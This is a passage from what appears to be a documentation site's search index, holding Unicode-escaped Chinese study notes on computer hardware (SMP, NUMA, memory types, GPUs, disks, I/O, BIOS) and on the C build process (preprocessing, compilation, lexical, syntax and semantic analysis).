\u5bf9\u79f0\u591a\u5904\u7406\u67b6\u6784(SMP)\uff0c\u591a\u7528\u4e8e\u684c\u9762\u7aef\u3002\u6bcf\u4e2a\u5904\u7406\u5668(\u5728\u591a\u6838\u5fc3\u5904\u7406\u5668\u7684\u4f8b\u5b50\u4e2d\uff0c\u5bf9\u79f0\u591a\u5904\u7406\u67b6\u6784\uff0c\u5c06\u6bcf\u4e00\u4e2a\u6838\u5fc3\u90fd\u5f53\u6210\u662f\u72ec\u7acb\u7684\u5904\u7406\u5668)\u7684\u5730\u4f4d\u662f\u5e73\u7b49\u7684\uff0c\u5bf9\u8d44\u6e90\u7684\u4f7f\u7528\u6743\u9650\u76f8\u540c\u3002\u597d\u5904\u662f\u4f53\u7cfb\u7b80\u5355\uff0c\u7f3a\u70b9\u5c31\u662f\u7531\u4e8e\u53ea\u6709\u4e00\u4e2a\u5185\u5b58\u63a7\u5236\u5668\uff0c\u5b58\u5728\u8d44\u6e90\u7ade\u4e89\u7684\u95ee\u9898\uff0c\u4e00\u822c\u662f\u901a\u8fc7\u8f6f\u786c\u4ef6\u9501\u7684\u673a\u5236\u89e3\u51b3\uff0c\u4f46\u968f\u7740\u5904\u7406\u5668\u6570\u91cf\u589e\u52a0\u8bbf\u95ee\u51b2\u7a81\u5c31\u4f1a\u589e\u52a0\uff0c\u6548\u7387\u5c31\u4f1a\u4e0b\u964d\u3002</p> <p>\u975e\u7edf\u4e00\u5185\u5b58\u8bbf\u95ee\u67b6\u6784(NUMA)\uff0c\u662f\u4e00\u79cd\u4e3a\u591a\u5904\u7406\u5668\u7684\u7535\u8111\u8bbe\u8ba1\u7684\u5185\u5b58\u67b6\u6784\u3002\u5b83\u5c06\u5185\u5b58\u5206\u6563\u7ed9\u591a\u4e2a\u5904\u7406\u5668\uff0c\u5904\u7406\u5668\u8bbf\u95ee\u5b83\u81ea\u5df1\u7684\u672c\u5730\u5185\u5b58\u7684\u901f\u5ea6\u6bd4\u975e\u672c\u5730\u5185\u5b58(\u5185\u5b58\u4f4d\u4e8e\u53e6\u4e00\u4e2a\u5904\u7406\u5668\uff0c\u6216\u8005\u662f\u5904\u7406\u5668\u4e4b\u95f4\u5171\u4eab\u7684\u5185\u5b58)\u5feb\u4e00\u4e9b\u3002\u5b83\u7684\u6269\u5c55\u6027\u66f4\u597d\uff0c\u66f4\u9002\u7528\u4e8e\u670d\u52a1\u5668\uff0c\u9488\u5bf9\u8fd9\u79cd\u67b6\u6784\u53bb\u7f16\u5199\u7a0b\u5e8f\u6548\u7387\u4e5f\u4f1a\u66f4\u9ad8\u3002</p>"},{"location":"sicp/hardware/#_13","title":"\u8d85\u7ebf\u7a0b","text":"<p> \u5bf9\u4e8eIO\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u4f1a\u51fa\u73b0CPU\u7b49\u5f85\u65f6\u95f4\u957f\u7684\u60c5\u51b5\u3002\u90a3\u4e48\u200b\u8d85\u7ebf\u7a0b\u200b\u5c31\u662f\u5229\u7528\u7279\u6b8a\u7684\u6307\u4ee4\uff0c\u5728\u5355\u4e2a\u7269\u7406\u6838\u5185\u865a\u62df\u51fa\u591a\u4e2a\u903b\u8f91\u5904\u7406\u5668\uff0c\u5728\u6307\u4ee4\u7b49\u5f85\u65f6\u505a\u522b\u7684\u4efb\u52a1\u6765\u51cf\u5c11\u95f2\u7f6e\u7684\u65f6\u95f4\uff0c\u5f53\u7136\u4e5f\u9700\u8981\u989d\u5916\u7684\u5730\u65b9(AS\uff0carchitectural state)\u4fdd\u5b58\u5f53\u524d\u4e0a\u4e0b\u6587\u4ee5\u5207\u6362\u4efb\u52a1\u3002</p> <p>\u4e00\u822c\u8bed\u8a00\u91cc\u63d0\u4f9b\u7684CPU\u6570\u91cf\u90fd\u662f\u903b\u8f91\u5904\u7406\u5668\u7684\u6570\u91cf\uff0c\u4f1a\u5c06\u8d85\u7ebf\u7a0b\u865a\u62df\u7684\u4e5f\u7b97\u8fdb\u53bb\u3002\u4f8b\u5982python\u7684<code>multiprocessing.cpu_count()</code>\uff0c\u6216Go\u7684<code>runtime.NumCPU()</code>\u3002</p> <p>\u8d85\u7ebf\u7a0b\u591a\u6570\u65f6\u5019\u53ef\u63d0\u5347\u6267\u884c\u6548\u7387\uff0c\u4f46\u5728\u6709\u4e9b\u60c5\u51b5\u4e0b\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6027\u80fd\u4e0b\u964d\uff0c\u4f8b\u5982\u4e00\u4e9bCPU\u5bc6\u96c6\u7684\u573a\u5408\u53ef\u80fd\u4f1a\u5bf9\u5783\u573e\u56de\u6536\u5668\u9020\u6210\u8d1f\u62c5\uff1b\u6216\u8005\u8d44\u6e90\u51b2\u7a81\u65f6\uff0c\u4f9d\u7136\u9700\u8981\u7b49\u5f85\uff0c\u7c7b\u4f3c\u4e8e\u540c\u6b65\u9501\u3002</p>"},{"location":"sicp/hardware/#_14","title":"\u5185\u5b58","text":"<p>\u5185\u5b58\u4e25\u683c\u6765\u8bf4\u53eb\u200b\u5185\u90e8\u5b58\u50a8\u5668\uff0c\u4e0d\u6b62\u5305\u62ec\u7269\u7406\u4e0a\u7684\u5185\u5b58\u6761(\u5373\u4e3b\u5b58)\uff0c\u786c\u76d8\u3001\u6253\u5370\u673a\u7b49\u7f13\u5b58\u4e5f\u7b97\u4f5c\u5185\u90e8\u5b58\u50a8\u5668\u3002</p> <p>\u8fd9\u91cc\u8bf4\u7684\u662f\u4e3b\u5b58\uff0c\u5373\u200b\u968f\u673a\u5b58\u53d6\u5b58\u50a8\u5668(RAM\uff0cRandom Access Memory)\uff0c\u5b83\u662f\u4e0eCPU\u76f4\u63a5\u4ea4\u6362\u6570\u636e\u7684\u5185\u90e8\u5b58\u50a8\u5668\u3002\u5b83\u53ef\u4ee5\u968f\u65f6\u8bfb\u5199\uff0c\u4e14\u901f\u5ea6\u5f88\u5feb\uff0c\u901a\u5e38\u505a\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e34\u65f6\u6570\u636e\u5b58\u50a8\u4ecb\u8d28\u3002\u6240\u8c13\u7684\u200b\u968f\u673a\u5b58\u53d6\uff0c\u662f\u6307\u5f53\u5b58\u50a8\u5668\u7684\u6d88\u606f\u88ab\u8bfb\u53d6\u6216\u5199\u5165\u65f6\uff0c\u6240\u9700\u8981\u7684\u65f6\u95f4\u4e0e\u8fd9\u6bb5\u4fe1\u606f\u6240\u5728\u7684\u4f4d\u7f6e\u65e0\u5173\u3002</p>"},{"location":"sicp/hardware/#dram","title":"DRAM","text":"<p>\u52a8\u6001\u968f\u673a\u5b58\u53d6\u5b58\u50a8\u5668\u3002\u5b83\u5177\u6709\u7ed3\u6784\u7b80\u5355\uff0c\u7a7a\u95f4\u5c0f\uff0c\u9700\u8981\u5237\u65b0\u7684\u7279\u70b9\uff0c\u5f80\u5f80\u88ab\u7528\u4e8e\u4f5c\u4e3a\u4e3b\u5b58\u3002</p> <p>\u9700\u8981\u5237\u65b0\uff0c\u662f\u6307\u7535\u5bb9\u5668\u5145\u6ee1\u7535\u540e\u4ee3\u88681\uff0c\u672a\u5145\u7535\u7684\u4ee3\u88680\u3002\u7531\u4e8e\u7535\u5bb9\u5668\u6216\u591a\u6216\u5c11\u6709\u6f0f\u7535\u7684\u60c5\u5f62\uff0c\u82e5\u4e0d\u4f5c\u7279\u522b\u5904\u7406\uff0c\u7535\u8377\u4f1a\u6e10\u6e10\u968f\u65f6\u95f4\u6d41\u5931\u800c\u4f7f\u6570\u636e\u53d1\u751f\u9519\u8bef\u3002\u5237\u65b0\u662f\u6307\u91cd\u65b0\u4e3a\u7535\u5bb9\u5668\u5145\u7535\uff0c\u5f25\u8865\u6d41\u5931\u4e86\u7684\u7535\u8377\u3002</p> <p>DDR\u200b\u662f\u6307\u5177\u6709\u53cc\u500d\u6570\u636e\u4f20\u8f93\u7387\u7684SDRAM(\u52a8\u6001\u968f\u673a\u5b58\u53d6\u5b58\u50a8\u5668)\uff0c\u5176\u6570\u636e\u4f20\u8f93\u901f\u5ea6\u4e3a\u7cfb\u7edf\u65f6\u8109\u7684\u4e24\u500d\u3002</p>"},{"location":"sicp/hardware/#sram","title":"SRAM","text":"<p>\u9759\u6001\u968f\u673a\u5b58\u53d6\u5b58\u50a8\u5668\u3002\u5b83\u5177\u6709\u7ed3\u6784\u590d\u6742\uff0c\u6210\u672c\u9ad8\uff0c\u901f\u5ea6\u5feb\u7684\u7279\u70b9\uff0c\u4e00\u4e2a\u5178\u578b\u7684\u5e94\u7528\u5c31\u662f\u7f13\u5b58\u3002</p> <p>\u6240\u8c13\u7684\u201c\u9759\u6001\u201d\uff0c\u662f\u6307\u8fd9\u79cd\u5b58\u50a8\u5668\u53ea\u8981\u4fdd\u6301\u901a\u7535\uff0c\u91cc\u9762\u50a8\u5b58\u7684\u6570\u636e\u5c31\u53ef\u4ee5\u6052\u5e38\u4fdd\u6301\u3002\u76f8\u5bf9\u4e4b\u4e0b\uff0cDRAM\u91cc\u9762\u6240\u50a8\u5b58\u7684\u6570\u636e\u5c31\u9700\u8981\u5468\u671f\u6027\u5730\u66f4\u65b0\u3002</p>"},{"location":"sicp/hardware/#_15","title":"\u53cc\u901a\u9053","text":"<p>\u5b83\u5728\u5317\u6865\u5185\u4f7f\u7528\u4e24\u4e2a\u5185\u5b58\u63a7\u5236\u5668\u5206\u522b\u63a7\u5236\u4e00\u4e2a\u901a\u9053\uff0c\u4ece\u800c\u589e\u52a0\u5bfb\u5740\u548c\u5b58\u50a8\u5e26\u5bbd\uff0c\u4f46\u662f\u7531\u4e8e\u7f13\u5b58\u7684\u5b58\u5728\uff0c\u5e76\u4e0d\u9700\u8981\u8fd9\u6837\u7684\u5e26\u5bbd\uff0c\u6240\u4ee5\u5b83\u5bf9\u6027\u80fd\u7684\u63d0\u5347\u5f80\u5f80\u611f\u53d7\u4e0d\u51fa\u6765\u3002\u5728\u96c6\u6210\u663e\u5361\u7684\u573a\u666f\u4e0b\u4f1a\u6709\u4e00\u5b9a\u5e2e\u52a9\uff0c\u56e0\u4e3a\u96c6\u6210\u663e\u5361\u7528\u5185\u5b58\u4f5c\u4e3a\u663e\u5b58\uff0c\u53ef\u4ee5\u4e13\u95e8\u4f7f\u7528\u4e00\u6761\u901a\u9053\u3002</p>"},{"location":"sicp/hardware/#_16","title":"\u663e\u5361","text":"<p>\u663e\u5361\u200b\u7528\u4e8e\u8f6c\u6362\u663e\u793a\u4fe1\u606f\uff0c\u5411\u663e\u793a\u5668\u63d0\u4f9b\u626b\u63cf\u4fe1\u53f7\u3002</p> <ul> <li>2D\u82af\u7247\u5904\u74063D\u65f6\u9700\u8981CPU\u53c2\u4e0e\uff0c\u79f0\u4f5c\u200b\u8f6f\u52a0\u901f\u3002</li> <li>3D\u82af\u7247\u81ea\u5df1\u5b8c\u6210\uff0c\u79f0\u4f5c\u200b\u786c\u52a0\u901f\u3002</li> </ul> <p>GPU\u200b\u662f\u4e13\u95e8\u7528\u6765\u6267\u884c\u590d\u6742\u7684\u6570\u5b66\u548c\u51e0\u4f55\u8ba1\u7b97\u7684\uff0c\u5b83\u548cCPU\u6709\u4ec0\u4e48\u533a\u522b\u5462\uff1f</p> <p>CPU\u9700\u8981\u5f88\u5f3a\u7684\u901a\u7528\u6027\u6765\u5904\u7406\u5404\u79cd\u4e0d\u540c\u7684\u6570\u636e\u7c7b\u578b\uff0c\u540c\u65f6\u53c8\u8981\u903b\u8f91\u5224\u65ad\u53c8\u4f1a\u5f15\u5165\u5927\u91cf\u7684\u5206\u652f\u8df3\u8f6c\u548c\u4e2d\u65ad\u7684\u5904\u7406\u3002\u8fd9\u4e9b\u90fd\u4f7f\u5f97CPU\u7684\u5185\u90e8\u7ed3\u6784\u5f02\u5e38\u590d\u6742\u3002\u800cGPU\u9762\u5bf9\u7684\u5219\u662f\u7c7b\u578b\u9ad8\u5ea6\u7edf\u4e00\u7684\u3001\u76f8\u4e92\u65e0\u4f9d\u8d56\u7684\u5927\u89c4\u6a21\u6570\u636e\u548c\u4e0d\u9700\u8981\u88ab\u6253\u65ad\u7684\u7eaf\u51c0\u7684\u8ba1\u7b97\u73af\u5883\u3002GPU\u7684\u6838\u6570\u8fdc\u8d85CPU\uff0c\u88ab\u79f0\u4e3a\u4f17\u6838(NVIDIA Fermi\u6709512\u4e2a\u6838)\u3002\u6bcf\u4e2a\u6838\u62e5\u6709\u7684\u7f13\u5b58\u5927\u5c0f\u76f8\u5bf9\u5c0f\uff0c\u6570\u5b57\u903b\u8f91\u8fd0\u7b97\u5355\u5143\u4e5f\u5c11\u800c\u7b80\u5355\u3002</p> <p>\u5f53\u7a0b\u5e8f\u5458\u4e3aCPU\u7f16\u5199\u7a0b\u5e8f\u65f6\uff0c\u4ed6\u4eec\u503e\u5411\u4e8e\u5229\u7528\u590d\u6742\u7684\u903b\u8f91\u7ed3\u6784\u4f18\u5316\u7b97\u6cd5\u4ece\u800c\u51cf\u5c11\u8ba1\u7b97\u4efb\u52a1\u7684\u8fd0\u884c\u65f6\u95f4\uff0c\u5373Latency\u3002\u5f53\u7a0b\u5e8f\u5458\u4e3aGPU\u7f16\u5199\u7a0b\u5e8f\u65f6\uff0c\u5219\u5229\u7528\u5176\u5904\u7406\u6d77\u91cf\u6570\u636e\u7684\u4f18\u52bf\uff0c\u901a\u8fc7\u63d0\u9ad8\u603b\u7684\u6570\u636e\u541e\u5410\u91cf(Throughput)\u6765\u63a9\u76d6Latency\u3002</p>"},{"location":"sicp/hardware/#_17","title":"\u786c\u76d8","text":"<p>\u4e3b\u8981\u7684\u6301\u4e45\u5316\u5b58\u50a8\u5a92\u4ecb\u3002</p> <p>\u5206\u4e3a\u200b\u56fa\u6001\u786c\u76d8\u200b(SSD)\u548c\u200b\u673a\u68b0\u786c\u76d8(HDD)\u3002SSD\u4f7f\u2f64\u975e\u6613\u5931\u6027\u5185\u5b58NAND Flash\u5b58\u50a8\u6570\u636e\uff0c\u65e0\u987b\u7535\u2f12\u7ef4\u6301\u3002\u53c8\u5206\u4e3a\u5355\u5c42SLC\u3001\u53cc\u5c42MLC\u3001\u4e09\u5c42TLC\u3002\u5355\u5c42\u6700\u5feb\uff0c\u5bff\u547d\u6700\u2ed3\uff0c\u6210\u672c\u4e5f\u6700\u2fbc\u3002\u73b0\u5728\u591a\u4f7f\u2f64MLC\uff0cTLC\u5e38\u4f5c\u4e3aU\u76d8\u3002</p> <p>\u5176\u63a5\u53e3\u53c8\u5206\u4e3aSATA\u548cSCSI\u3002SATA\u662f\u4e32\u884cATA\uff0cPC\u7684\u6807\u51c6\u63a5\u53e3\u3002SCSI\u591a\u7528\u4e8e\u5c0f\u578b\u673a\u3002</p> <p>\u5176\u5de5\u4f5c\u6a21\u5f0f\u5728BIOS\u53ef\u4ee5\u8bbe\u7f6e\uff0c\u65e9\u671f\u5927\u591a\u4f7f\u7528\u200bPIO\uff0c\u5373\u901a\u8fc7CPU\u6267\u884cIO\u6307\u4ee4\u8bfb\u5199\u6570\u636e\uff0cCPU\u8981\u6301\u7eed\u53c2\u4e0e\u3002\u73b0\u5728\u591a\u4f7f\u7528\u200bDMA\uff0cCPU\u53ea\u9700\u8981\u5728\u5f00\u59cb\u548c\u7ed3\u675f\u65f6\u53c2\u4e0e\uff0c\u4e2d\u95f4\u7531DMA\u63a7\u5236\u5668\u6765\u5b8c\u6210\u3002</p>"},{"location":"sicp/hardware/#io","title":"IO","text":"<p>cpu\u5982\u4f55\u8bbf\u95ee\u4e00\u5927\u5806\u7684\u8bbe\u5907\uff1f\u5206\u4e3aPMIO\u548cMMIO\u3002</p> <p>PMIO(Port Mapped I/O)\u662f\u6307\u7aef\u53e3\u6620\u5c04\u8f93\u5165\u8f93\u51fa\uff0c\u65e9\u671f\u7684\u65f6\u5019\u4f1a\u628a\u4e3b\u5b58\u548c\u5176\u4ed6\u8bbe\u5907\u5206\u5f00\uff0c\u5206\u522b\u7528\u4e0d\u540c\u7684CPU\u6307\u4ee4\u8bfb\u5199\u3002\u56e0\u4e3a\u4f7f\u7528\u4e86\u4e0d\u540c\u7684\u5730\u5740\u603b\u7ebf\uff0c\u5357\u6865\u4e00\u4e9b\u6162\u901f\u8bbe\u5907\u7684\u8bbf\u95ee\u4e0d\u4f1a\u62d6\u7d2f\u4e3b\u5b58\u8bbf\u95ee\u7684\u6548\u7387\u3002</p> <p>\u540e\u6765\u53d1\u73b0\u8fd9\u79cd\u65b9\u5f0f\u4e0d\u597d\uff0c64\u4f4d\u65f6\u4ee3\u5185\u5b58\u5730\u5740\u7a7a\u95f4\u5145\u88d5\u4e86\u5c31\u4f7f\u7528\u4e86\u200bMMIO(Memory Mapped I/O)\uff0c\u5b83\u628a\u5185\u5b58\u5730\u5740\u7a7a\u95f4\u5206\u6bb5\uff0c\u67d0\u4e00\u6bb5\u8bbe\u5907\u7528\u3001\u7a0b\u5e8f\u7528\u3001\u64cd\u4f5c\u7cfb\u7edf\u7528\u7b49\uff0cCPU\u4f7f\u7528\u76f8\u540c\u7684\u6307\u4ee4\u4e0d\u540c\u7684\u5730\u5740\u5c31\u53ef\u64cd\u4f5c\u8bbe\u5907\uff0c\u6240\u6709\u7684\u8bbe\u5907\u90fd\u5728\u76d1\u63a7\u5730\u5740\u603b\u7ebf\uff0c\u53d1\u73b0\u81ea\u5df1\u88ab\u8bbf\u95ee\u5c31\u901a\u8fc7\u81ea\u8eab\u7684\u7f13\u5b58\u548cMMU\u5efa\u7acb\u8fde\u63a5\u3002</p>"},{"location":"sicp/hardware/#bios","title":"BIOS","text":"<p>\u57fa\u672c\u8f93\u5165\u8f93\u51fa\u7cfb\u7edf\uff0c\u542f\u52a8\u540e\u52a0\u8f7d\u7684\u7b2c\u4e00\u4e2a\u7a0b\u5e8f\u3002</p> <p>\u6700\u65e9\u6ca1\u6709\u64cd\u4f5c\u7cfb\u7edf\u7684\u65f6\u5019\uff0c\u5199\u7684\u7a0b\u5e8f\u5c31\u662f\u9762\u5411BIOS\u7684\uff0cBIOS\u5728\u5b8c\u6210\u786c\u4ef6\u521d\u59cb\u5316\u4e4b\u540e\uff0c\u4f1a\u53bb\u6267\u884c\u786c\u76d8\u4e0a\u67d0\u4e2a\u7279\u5b9a\u6247\u533a\u7684\u6307\u4ee4\uff0c\u6240\u4ee5\u53ea\u8981\u628a\u7a0b\u5e8f\u653e\u5728\u7279\u5b9a\u4f4d\u7f6e\u7a0b\u5e8f\u5c31\u53ef\u4ee5\u542f\u52a8\u3002\u540e\u6765\u64cd\u4f5c\u7cfb\u7edf\u5c31\u653e\u5728\u90a3\u4e2a\u4f4d\u7f6e\uff0c\u6211\u4eec\u5199\u7684\u7a0b\u5e8f\u9762\u5411\u64cd\u4f5c\u7cfb\u7edf\u3002</p> <p>\u5b83\u5411\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u7cfb\u7edf\u53c2\u6570\u3001\u5f15\u5bfc\u64cd\u4f5c\u7cfb\u7edf\uff0c\u4f46\u73b0\u4ee3\u7684\u64cd\u4f5c\u7cfb\u7edf\u6bd4\u5982mac\u5c31\u6ca1\u6709BIOS\uff0c\u800c\u662f\u76f4\u63a5\u63a7\u5236\u786c\u4ef6\u3002</p>"},{"location":"sicp/program/","title":"\u8ba1\u7b97\u673a\u79d1\u5b66\u57fa\u7840\u77e5\u8bc6\u4e4b\u7a0b\u5e8f\u90e8\u5206","text":""},{"location":"sicp/program/#_2","title":"\u7a0b\u5e8f\u6784\u5efa","text":"<p>\u7a0b\u5e8f\u6784\u5efa\u7684\u8fc7\u7a0b\u5c31\u662f\u628a\u5199\u7ed9\u4eba\u770b\u7684\u4ee3\u7801\u7ffb\u8bd1\u6210\u5199\u7ed9\u673a\u5668\u770b\u7684\u4ee3\u7801\u3002\u5f53\u6211\u4eec\u4f7f\u7528C\u8bed\u8a00\u7f16\u5199\u4e86\u4e00\u4e2a\u8f93\u51fahello world\u7684\u5c0f\u7a0b\u5e8f\uff0c\u53ea\u9700\u8981<code>gcc hello.c</code>\u5c31\u4f1a\u5f97\u5230\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6<code>a.out</code>\uff0c\u7136\u540e\u76f4\u63a5\u6253\u5f00\u5c31\u53ef\u4ee5\u8f93\u51fa\u3002\u4f46\u662f\u5b83\u7684\u80cc\u540e\u5374\u6ca1\u6709\u8fd9\u4e48\u7b80\u5355:</p> <p></p> <p>\u8fd9\u4e2a\u8fc7\u7a0b\u5927\u4f53\u4e0a\u5206\u4e3a\u9884\u5904\u7406(Prepressing)\u3001\u7f16\u8bd1(Compilation)\u3001\u6c47\u7f16(Assembly)\u548c\u94fe\u63a5(Linking)\u3002</p>"},{"location":"sicp/program/#_3","title":"\u9884\u5904\u7406","text":"<p>\u4e5f\u53eb\u9884\u7f16\u8bd1\uff0c\u8fd9\u4e00\u6b65\u4e3b\u8981\u8fdb\u884c\u5982\u4e0b\u5904\u7406:</p> <ul> <li>\u5c06\u6240\u6709\u7684<code>#define</code>\u5220\u9664\uff0c\u5e76\u5c55\u5f00\u6240\u6709\u7684\u5b8f\u5b9a\u4e49</li> <li>\u5904\u7406\u6240\u6709\u7684\u6761\u4ef6\u9884\u7f16\u8bd1\u6307\u4ee4\uff0c\u5982<code>#if</code>\u3001<code>#ifdef</code>\u7b49</li> <li>\u5904\u7406<code>#include</code>\uff0c\u5c06\u88ab\u5305\u542b\u7684\u6587\u4ef6\u63d2\u5165\u5230\u8be5\u4f4d\u7f6e\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u662f\u9012\u5f52\u7684</li> <li>\u5220\u9664\u6240\u6709\u7684\u6ce8\u91ca<code>//</code>\u548c<code>/* ... */</code></li> <li>\u6dfb\u52a0\u884c\u53f7\u548c\u6587\u4ef6\u540d\u6807\u8bc6\uff0c\u4fbf\u4e8e\u540e\u7eed\u7f16\u8bd1\u65f6\u80fd\u4ea7\u751f\u8c03\u8bd5\u4fe1\u606f</li> <li>\u4fdd\u7559\u6240\u6709\u7684<code>#pragma</code>\u6307\u4ee4\uff0c\u5b83\u662f\u7528\u6765\u8bbe\u5b9a\u7f16\u8bd1\u5668\u72b6\u6001\u6216\u7279\u6b8a\u52a8\u4f5c\u7684</li> </ul> <p>\u8fd9\u4e00\u6b65\u53ef\u4ee5\u7528\u8fc7<code>gcc -E hello.c -o hello.i</code>\u6765\u5b8c\u6210\uff0c\u9884\u5904\u7406\u540e\u7684\u4ee3\u7801\u5e76\u975e\u4e8c\u8fdb\u5236\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u6253\u5f00\u3002</p>"},{"location":"sicp/program/#_4","title":"\u7f16\u8bd1","text":"<p>\u8fd9\u4e2a\u8fc7\u7a0b\u662f\u6574\u4e2a\u7a0b\u5e8f\u6784\u5efa\u6700\u6838\u5fc3\u7684\u90e8\u5206\uff0c\u53ef\u4ee5\u7ec6\u5206\u4e3a\u8bcd\u6cd5\u5206\u6790\u3001\u8bed\u6cd5\u5206\u6790\u3001\u8bed\u4e49\u5206\u6790\u3001\u4e2d\u95f4\u8bed\u8a00\u751f\u6210\u548c\u76ee\u6807\u4ee3\u7801\u751f\u6210\u4f18\u5316\u8fd9\u4e9b\u5c0f\u6b65:</p> <p></p> <p>\u8fd9\u4e2a\u8fc7\u7a0b\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7<code>gcc -S hello.i -o hello.s</code>\u6765\u505a\u3002\u5b9e\u9645\u4e0a\u5728GNU\u7684\u6807\u51c6\u4e2d\uff0cgcc\u53ea\u662f\u4e00\u4e9b\u540e\u53f0\u7a0b\u5e8f\u7684\u5305\u88c5\uff0c\u9884\u5904\u7406\u548c\u7f16\u8bd1\u90fd\u4f7f\u7528\u4e00\u4e2a\u53ebcc1\u7684\u7a0b\u5e8f\uff0c\u6c47\u7f16\u5668\u662fas\uff0c\u94fe\u63a5\u5668\u662fld\u3002</p>"},{"location":"sicp/program/#_5","title":"\u8bcd\u6cd5\u5206\u6790","text":"<p>\u6e90\u4ee3\u7801\u88ab\u8f93\u5165\u5230\u626b\u63cf\u5668(Scanner)\uff0c\u626b\u63cf\u5668\u8fd0\u7528\u6709\u9650\u72b6\u6001\u673a(Finite State Machine)\u7684\u7b97\u6cd5\u5c06\u6e90\u4ee3\u7801\u7684\u5b57\u7b26\u5e8f\u5217\u5206\u5272\u6210\u4e00\u7cfb\u5217\u7684\u8bb0\u53f7(Token)\u5e76\u7ed9\u5b83\u4eec\u5206\u597d\u7c7b\u3002\u6bd4\u5982<code>array[index] = (index + 4) * (2 + 6)</code>\u8fd9\u6837\u4e00\u884c\u6e90\u7801\u7ecf\u8fc7\u626b\u63cf\u540e\u4f1a\u4ea7\u751f\u5982\u4e0b\u8bb0\u53f7:</p> \u8bb0\u53f7(Token) \u7c7b\u578b array \u6807\u8bc6\u7b26 [ \u5de6\u65b9\u62ec\u53f7 index \u6807\u8bc6\u7b26 ] \u53f3\u65b9\u62ec\u53f7 = \u8d4b\u503c ( \u5de6\u5706\u62ec\u53f7 index \u6807\u8bc6\u7b26 + \u52a0\u53f7 4 \u6570\u5b57 ) \u53f3\u5706\u62ec\u53f7 * \u4e58\u53f7 ( \u5de6\u5706\u62ec\u53f7 2 \u6570\u5b57 + \u52a0\u53f7 6 \u6570\u5b57 ) \u53f3\u5706\u62ec\u53f7 <p>\u4ea7\u751f\u7684\u8bb0\u53f7\u53ef\u4ee5\u5206\u7c7b\u4e3a\u5173\u952e\u5b57\u3001\u6807\u8bc6\u7b26\u3001\u5b57\u9762\u91cf(\u5305\u542b\u6570\u5b57\u3001\u5b57\u7b26\u4e32\u7b49)\u548c\u7279\u6b8a\u7b26\u53f7(\u5982\u52a0\u53f7\u3001\u4e58\u53f7\u7b49)\u3002\u8bc6\u522b\u8bb0\u53f7\u7684\u540c\u65f6\uff0c\u626b\u63cf\u5668\u8fd8\u4f1a\u5c06\u6807\u8bc6\u7b26\u5b58\u5728\u7b26\u53f7\u8868\uff0c\u5c06\u5b57\u9762\u91cf\u5b58\u653e\u5230\u6587\u5b57\u8868\u3002</p>"},{"location":"sicp/program/#_6","title":"\u8bed\u6cd5\u5206\u6790","text":"<p>\u63a5\u7740\uff0c\u8bed\u6cd5\u5206\u6790\u5668(Grammar Parser)\u4f1a\u5bf9\u626b\u63cf\u5668\u4ea7\u751f\u7684\u8bb0\u53f7\u8fdb\u884c\u8bed\u6cd5\u5206\u6790\uff0c\u4ece\u800c\u4ea7\u751f\u8bed\u6cd5\u6811(Syntax Tree)\u3002\u4e0a\u4f8b\u4e2d\u7684\u8868\u8fbe\u5f0f\u5f97\u5230\u7684\u8bed\u6cd5\u6811\u4e3a:</p> <p></p> <p>\u6574\u4e2a\u5206\u6790\u8fc7\u7a0b\u91c7\u7528\u4e00\u79cd\u53eb\u4e0a\u4e0b\u6587\u65e0\u5173\u8bed\u6cd5(Context-free Grammar)\u7684\u624b\u6bb5\uff0c\u6574\u4e2a\u8bed\u53e5\u88ab\u770b\u6210\u4e00\u4e2a\u8d4b\u503c\u8868\u8fbe\u5f0f\uff0c\u5176\u5de6\u8fb9\u662f\u4e00\u4e2a\u6570\u7ec4\u8868\u8fbe\u5f0f\uff0c\u53f3\u8fb9\u662f\u4e00\u4e2a\u4e58\u6cd5\u8868\u8fbe\u5f0f\u3002\u5728\u8fd9\u4e00\u6b65\uff0c\u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u7ea7\u548c\u542b\u4e49\u88ab\u786e\u5b9a\u4e86\u4e0b\u6765\uff0c\u4f8b\u5982<code>*</code>\u65e2\u53ef\u4ee5\u662f\u4e58\u53f7\u53c8\u53ef\u4ee5\u662f\u6307\u9488\uff0c\u5728\u8be5\u8868\u8fbe\u5f0f\u4e2d\u5177\u4f53\u6307\u4ec0\u4e48\u5c31\u662f\u5728\u8fd9\u4e00\u6b65\u786e\u5b9a\u7684\u3002</p>"},{"location":"sicp/program/#_7","title":"\u8bed\u4e49\u5206\u6790","text":"<p>\u8bed\u6cd5\u5206\u6790\u53ea\u662f\u5bf9\u8868\u8fbe\u5f0f\u8bed\u6cd5\u5c42\u9762\u8fdb\u884c\u4e86\u5206\u6790\uff0c\u5b83\u4e0d\u4e86\u89e3\u8fd9\u4e2a\u8bed\u53e5\u662f\u5426\u662f\u771f\u6b63\u6709\u610f\u4e49\u7684\uff0c\u6bd4\u5982C\u91cc\u9762\u6307\u9488\u7684\u4e58\u6cd5\u8fd0\u7b97\u662f\u6ca1\u6709\u610f\u4e49\u7684\uff0c\u4f46\u5b83\u662f\u5408\u4e4e\u8bed\u6cd5\u7684\u3002\u90a3\u4e48\u6b64\u65f6\uff0c\u8bed\u4e49\u5206\u6790\u5668(Semantic Analyzer)\u53ef\u4ee5\u5b8c\u6210\u5bf9\u9759\u6001\u8bed\u4e49\u7684\u5206\u6790\u3002</p> <p>\u9759\u6001\u8bed\u4e49(Static Semantic)\u662f\u6307\u5728\u7f16\u8bd1\u671f\u53ef\u4ee5\u786e\u5b9a\u7684\u8bed\u4e49\uff0c\u901a\u5e38\u5305\u62ec\u58f0\u660e\u548c\u7c7b\u578b\u7684\u5339\u914d\uff0c\u7c7b\u578b\u7684\u8f6c\u6362\uff0c\u4f8b\u5982\u628a\u4e00\u4e2a\u6d6e\u70b9\u6570\u8d4b\u503c\u7ed9\u6574\u578b\u8868\u8fbe\u5f0f\uff0c\u5176\u4e2d\u7684\u9690\u5f0f\u7c7b\u578b\u8f6c\u6362\u7684\u8fc7\u7a0b\u5c31\u7531\u8bed\u4e49\u5206\u6790\u5b8c\u6210\u3002\u800c\u52a8\u6001\u8bed\u4e49(Dynamic 